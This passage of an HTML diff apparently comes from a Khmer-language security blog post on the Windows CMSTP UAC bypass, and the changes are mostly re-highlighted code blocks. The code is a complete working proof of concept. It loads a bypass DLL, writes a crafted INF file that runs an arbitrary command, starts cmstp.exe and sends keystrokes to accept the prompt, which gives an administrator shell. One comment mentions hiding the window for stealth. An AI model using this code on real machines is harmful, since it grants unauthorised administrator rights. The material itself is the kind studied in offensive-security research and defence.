+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&#34;$pwd\CMSTP-UAC-Bypass.dll&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GAC</span>    <span class="n">Version</span>        <span class="n">Location</span>
+</span></span><span class="line"><span class="cl"><span class="p">---</span>    <span class="p">-------</span>        <span class="p">--------</span>
+</span></span><span class="line"><span class="cl"><span class="n">False</span>  <span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="no">[CMSTPBypass]</span><span class="p">::</span><span class="n">Execute</span><span class="p">(</span><span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <p>ក្រោយពីរដំណើររួច នឹងមានលោតផ្ទាំង cmd អមមកជាមួយនិងសិទ្ធជា administrator ។</p>
@@ -2007,7 +2006,7 @@
 <h4 id="bonus---bypass-with-ps1-one-file-action">Bonus - Bypass With PS1 (One File Action)</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2142,139 +2141,139 @@
 </span><span class="lnt">133
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># UAC Bypass poc using SendKeys</span>
-<span class="c"># Version 1.0</span>
-<span class="c"># Author: Oddvar Moe</span>
-<span class="c"># Functions borrowed from: https://powershell.org/forums/topic/sendkeys/</span>
-<span class="c"># Todo: Hide window on screen for stealth</span>
-<span class="c"># Todo: Make script edit the INF file for command to inject...</span>
-
-
-<span class="k">Function</span> <span class="n">script</span><span class="err">:</span><span class="nb">Set-INFFile</span> <span class="p">{</span>
-<span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
-	<span class="k">Param</span> <span class="p">(</span>
-	<span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">HelpMessage</span><span class="p">=</span><span class="s2">&#34;Specify the INF file location&#34;</span><span class="p">)]</span>
-	<span class="nv">$InfFileLocation</span> <span class="p">=</span> <span class="s2">&#34;$env:temp\CMSTP.inf&#34;</span><span class="p">,</span>
-	
-	<span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">HelpMessage</span><span class="p">=</span><span class="s2">&#34;Specify the command to launch in a UAC-privileged window&#34;</span><span class="p">)]</span>
-	<span class="no">[String]</span><span class="nv">$CommandToExecute</span> <span class="p">=</span> <span class="s1">&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> <span class="c">#your action here</span>
-	<span class="p">)</span>
-
-<span class="nv">$InfContent</span> <span class="p">=</span> <span class="sh">@&#34;
-</span><span class="sh">[version]
-</span><span class="sh">Signature=`$chicago`$
-</span><span class="sh">AdvancedINF=2.5
-</span><span class="sh">[DefaultInstall]
-</span><span class="sh">CustomDestination=CustInstDestSectionAllUsers
-</span><span class="sh">RunPreSetupCommands=RunPreSetupCommandsSection
-</span><span class="sh">[RunPreSetupCommandsSection]
-</span><span class="sh">; Commands Here will be run Before Setup Begins to install
-</span><span class="sh">$CommandToExecute
-</span><span class="sh">taskkill /IM cmstp.exe /F
-</span><span class="sh">[CustInstDestSectionAllUsers]
-</span><span class="sh">49000,49001=AllUSer_LDIDSection, 7
-</span><span class="sh">[AllUSer_LDIDSection]
-</span><span class="sh">&#34;HKLM&#34;, &#34;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&#34;, &#34;ProfileInstallPath&#34;, &#34;%UnexpectedError%&#34;, &#34;&#34;
-</span><span class="sh">[Strings]
-</span><span class="sh">ServiceName=&#34;CorpVPN&#34;
-</span><span class="sh">ShortSvcName=&#34;CorpVPN&#34;
-</span><span class="sh">&#34;@</span>
-
-<span class="nv">$InfContent</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$InfFileLocation</span> <span class="n">-Encoding</span> <span class="n">ASCII</span>
-<span class="p">}</span>
-
-
-<span class="k">Function</span> <span class="nb">Get-Hwnd</span>
-<span class="p">{</span>
-  <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
-    
-  <span class="k">Param</span>
-  <span class="p">(</span>
-    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">,</span> <span class="k">ValueFromPipelineByPropertyName</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">)]</span> <span class="no">[string]</span> <span class="nv">$ProcessName</span>
-  <span class="p">)</span>
-  <span class="k">Process</span>
-    <span class="p">{</span>
-        <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="s1">&#39;Stop&#39;</span>
-        <span class="k">Try</span> 
-        <span class="p">{</span>
-            <span class="nv">$hwnd</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="nv">$ProcessName</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">MainWindowHandle</span>
-        <span class="p">}</span>
-        <span class="k">Catch</span> 
-        <span class="p">{</span>
-            <span class="nv">$hwnd</span> <span class="p">=</span> <span class="nv">$null</span>
-        <span class="p">}</span>
-        <span class="nv">$hash</span> <span class="p">=</span> <span class="p">@{</span>
-        <span class="n">ProcessName</span> <span class="p">=</span> <span class="nv">$ProcessName</span>
-        <span class="n">Hwnd</span>        <span class="p">=</span> <span class="nv">$hwnd</span>
-        <span class="p">}</span>
-        
-    <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">PsObject</span> <span class="n">-Property</span> <span class="nv">$hash</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nb">Set-WindowActive</span>
-<span class="p">{</span>
-  <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
-
-  <span class="k">Param</span>
-  <span class="p">(</span>
-    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">,</span> <span class="k">ValueFromPipelineByPropertyName</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">)]</span> <span class="no">[string]</span> <span class="nv">$Name</span>
-  <span class="p">)</span>
-  
-  <span class="k">Process</span>
-  <span class="p">{</span>
-    <span class="nv">$memberDefinition</span> <span class="p">=</span> <span class="sh">@&#39;
-</span><span class="sh">    [DllImport(&#34;user32.dll&#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-</span><span class="sh">    [DllImport(&#34;user32.dll&#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
-</span><span class="sh">&#39;@</span>
-
-    <span class="nb">Add-Type</span> <span class="n">-MemberDefinition</span> <span class="nv">$memberDefinition</span> <span class="n">-Name</span> <span class="n">Api</span> <span class="n">-Namespace</span> <span class="n">User32</span>
-    <span class="nv">$hwnd</span> <span class="p">=</span> <span class="nb">Get-Hwnd</span> <span class="n">-ProcessName</span> <span class="nv">$Name</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Hwnd</span>
-    <span class="k">If</span> <span class="p">(</span><span class="nv">$hwnd</span><span class="p">)</span> 
-    <span class="p">{</span>
-      <span class="nv">$onTop</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">IntPtr</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="n">0</span><span class="p">)</span>
-      <span class="no">[User32.Api]</span><span class="p">::</span><span class="n">SetForegroundWindow</span><span class="p">(</span><span class="nv">$hwnd</span><span class="p">)</span>
-      <span class="no">[User32.Api]</span><span class="p">::</span><span class="n">ShowWindow</span><span class="p">(</span><span class="nv">$hwnd</span><span class="p">,</span> <span class="n">5</span><span class="p">)</span>
-    <span class="p">}</span>
-    <span class="k">Else</span> 
-    <span class="p">{</span>
-      <span class="no">[string]</span> <span class="nv">$hwnd</span> <span class="p">=</span> <span class="s1">&#39;N/A&#39;</span>
-    <span class="p">}</span>
-
-    <span class="nv">$hash</span> <span class="p">=</span> <span class="p">@{</span>
-      <span class="k">Process</span> <span class="p">=</span> <span class="nv">$Name</span>
-      <span class="n">Hwnd</span>    <span class="p">=</span> <span class="nv">$hwnd</span>
-    <span class="p">}</span>
-        
-    <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">PsObject</span> <span class="n">-Property</span> <span class="nv">$hash</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="p">.</span> <span class="nb">Set-INFFile</span>
-<span class="c">#Needs Windows forms</span>
-<span class="nb">add-type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span>
-<span class="k">If</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$InfFileLocation</span><span class="p">)</span> <span class="p">{</span>
-<span class="c">#Command to run</span>
-<span class="nv">$ps</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">system</span><span class="p">.</span><span class="n">diagnostics</span><span class="p">.</span><span class="n">processstartinfo</span> <span class="s2">&#34;c:\windows\system32\cmstp.exe&#34;</span>
-<span class="nv">$ps</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s2">&#34;/au $InfFileLocation&#34;</span>
-<span class="nv">$ps</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="nv">$false</span>
-
-<span class="c">#Start it</span>
-<span class="no">[system.diagnostics.process]</span><span class="p">::</span><span class="n">Start</span><span class="p">(</span><span class="nv">$ps</span><span class="p">)</span>
-
-<span class="k">do</span>
-<span class="p">{</span>
-	<span class="c"># Do nothing until cmstp is an active window</span>
-<span class="p">}</span>
-<span class="k">until</span> <span class="p">((</span><span class="nb">Set-WindowActive</span> <span class="n">cmstp</span><span class="p">).</span><span class="n">Hwnd</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span>
-
-
-<span class="c">#Activate window</span>
-<span class="nb">Set-WindowActive</span> <span class="n">cmstp</span>
-
-<span class="c">#Send the Enter key</span>
-<span class="no">[System.Windows.Forms.SendKeys]</span><span class="p">::</span><span class="n">SendWait</span><span class="p">(</span><span class="s2">&#34;{ENTER}&#34;</span><span class="p">)</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># UAC Bypass poc using SendKeys</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Version 1.0</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Author: Oddvar Moe</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Functions borrowed from: https://powershell.org/forums/topic/sendkeys/</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Todo: Hide window on screen for stealth</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Todo: Make script edit the INF file for command to inject...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">Function</span> <span class="n">script</span><span class="err">:</span><span class="nb">Set-INFFile</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">	<span class="k">Param</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">HelpMessage</span><span class="p">=</span><span class="s2">&#34;Specify the INF file location&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$InfFileLocation</span> <span class="p">=</span> <span class="s2">&#34;$env:temp\CMSTP.inf&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">HelpMessage</span><span class="p">=</span><span class="s2">&#34;Specify the command to launch in a UAC-privileged window&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">	<span class="no">[String]</span><span class="nv">$CommandToExecute</span> <span class="p">=</span> <span class="s1">&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> <span class="c">#your action here</span>
+</span></span><span class="line"><span class="cl">	<span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$InfContent</span> <span class="p">=</span> <span class="sh">@&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sh">[version]
+</span></span></span><span class="line"><span class="cl"><span class="sh">Signature=`$chicago`$
+</span></span></span><span class="line"><span class="cl"><span class="sh">AdvancedINF=2.5
+</span></span></span><span class="line"><span class="cl"><span class="sh">[DefaultInstall]
+</span></span></span><span class="line"><span class="cl"><span class="sh">CustomDestination=CustInstDestSectionAllUsers
+</span></span></span><span class="line"><span class="cl"><span class="sh">RunPreSetupCommands=RunPreSetupCommandsSection
+</span></span></span><span class="line"><span class="cl"><span class="sh">[RunPreSetupCommandsSection]
+</span></span></span><span class="line"><span class="cl"><span class="sh">; Commands Here will be run Before Setup Begins to install
+</span></span></span><span class="line"><span class="cl"><span class="sh">$CommandToExecute
+</span></span></span><span class="line"><span class="cl"><span class="sh">taskkill /IM cmstp.exe /F
+</span></span></span><span class="line"><span class="cl"><span class="sh">[CustInstDestSectionAllUsers]
+</span></span></span><span class="line"><span class="cl"><span class="sh">49000,49001=AllUSer_LDIDSection, 7
+</span></span></span><span class="line"><span class="cl"><span class="sh">[AllUSer_LDIDSection]
+</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;HKLM&#34;, &#34;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&#34;, &#34;ProfileInstallPath&#34;, &#34;%UnexpectedError%&#34;, &#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sh">[Strings]
+</span></span></span><span class="line"><span class="cl"><span class="sh">ServiceName=&#34;CorpVPN&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sh">ShortSvcName=&#34;CorpVPN&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;@</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$InfContent</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$InfFileLocation</span> <span class="n">-Encoding</span> <span class="n">ASCII</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">Function</span> <span class="nb">Get-Hwnd</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">  <span class="k">Param</span>
+</span></span><span class="line"><span class="cl">  <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">,</span> <span class="k">ValueFromPipelineByPropertyName</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">)]</span> <span class="no">[string]</span> <span class="nv">$ProcessName</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">Process</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="s1">&#39;Stop&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">Try</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$hwnd</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="nv">$ProcessName</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">MainWindowHandle</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">Catch</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$hwnd</span> <span class="p">=</span> <span class="nv">$null</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hash</span> <span class="p">=</span> <span class="p">@{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ProcessName</span> <span class="p">=</span> <span class="nv">$ProcessName</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Hwnd</span>        <span class="p">=</span> <span class="nv">$hwnd</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">PsObject</span> <span class="n">-Property</span> <span class="nv">$hash</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nb">Set-WindowActive</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">Param</span>
+</span></span><span class="line"><span class="cl">  <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">,</span> <span class="k">ValueFromPipelineByPropertyName</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">)]</span> <span class="no">[string]</span> <span class="nv">$Name</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">Process</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$memberDefinition</span> <span class="p">=</span> <span class="sh">@&#39;
+</span></span></span><span class="line"><span class="cl"><span class="sh">    [DllImport(&#34;user32.dll&#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+</span></span></span><span class="line"><span class="cl"><span class="sh">    [DllImport(&#34;user32.dll&#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+</span></span></span><span class="line"><span class="cl"><span class="sh">&#39;@</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">Add-Type</span> <span class="n">-MemberDefinition</span> <span class="nv">$memberDefinition</span> <span class="n">-Name</span> <span class="n">Api</span> <span class="n">-Namespace</span> <span class="n">User32</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$hwnd</span> <span class="p">=</span> <span class="nb">Get-Hwnd</span> <span class="n">-ProcessName</span> <span class="nv">$Name</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Hwnd</span>
+</span></span><span class="line"><span class="cl">    <span class="k">If</span> <span class="p">(</span><span class="nv">$hwnd</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$onTop</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">IntPtr</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="no">[User32.Api]</span><span class="p">::</span><span class="n">SetForegroundWindow</span><span class="p">(</span><span class="nv">$hwnd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="no">[User32.Api]</span><span class="p">::</span><span class="n">ShowWindow</span><span class="p">(</span><span class="nv">$hwnd</span><span class="p">,</span> <span class="n">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Else</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="no">[string]</span> <span class="nv">$hwnd</span> <span class="p">=</span> <span class="s1">&#39;N/A&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$hash</span> <span class="p">=</span> <span class="p">@{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">Process</span> <span class="p">=</span> <span class="nv">$Name</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Hwnd</span>    <span class="p">=</span> <span class="nv">$hwnd</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">PsObject</span> <span class="n">-Property</span> <span class="nv">$hash</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.</span> <span class="nb">Set-INFFile</span>
+</span></span><span class="line"><span class="cl"><span class="c">#Needs Windows forms</span>
+</span></span><span class="line"><span class="cl"><span class="nb">add-type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span>
+</span></span><span class="line"><span class="cl"><span class="k">If</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$InfFileLocation</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c">#Command to run</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ps</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">system</span><span class="p">.</span><span class="n">diagnostics</span><span class="p">.</span><span class="n">processstartinfo</span> <span class="s2">&#34;c:\windows\system32\cmstp.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ps</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s2">&#34;/au $InfFileLocation&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ps</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="nv">$false</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Start it</span>
+</span></span><span class="line"><span class="cl"><span class="no">[system.diagnostics.process]</span><span class="p">::</span><span class="n">Start</span><span class="p">(</span><span class="nv">$ps</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c"># Do nothing until cmstp is an active window</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">until</span> <span class="p">((</span><span class="nb">Set-WindowActive</span> <span class="n">cmstp</span><span class="p">).</span><span class="n">Hwnd</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Activate window</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-WindowActive</span> <span class="n">cmstp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Send the Enter key</span>
+</span></span><span class="line"><span class="cl"><span class="no">[System.Windows.Forms.SendKeys]</span><span class="p">::</span><span class="n">SendWait</span><span class="p">(</span><span class="s2">&#34;{ENTER}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <p><b>ឯកសារដើម:</b></p>
@@ -2286,7 +2285,7 @@
     </article>
     
     
-<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>
+<script defer src="/js/clipboard.min.c168d3a04c45a631be76437054619a4a3b30107960cb9730be96012fef5762b0.js"></script>
 
 <script defer src="/js/helper/prev.min.js"></script>
 
@@ -2717,7 +2716,7 @@
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.b5af2be70ffc9ba2e83412609aa18b5b025c69399f9e1dce09d444a636a38cd0.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3741,7 +3740,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2019 - 2021 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.
+                    <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2019 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.
                 
             </p>
         
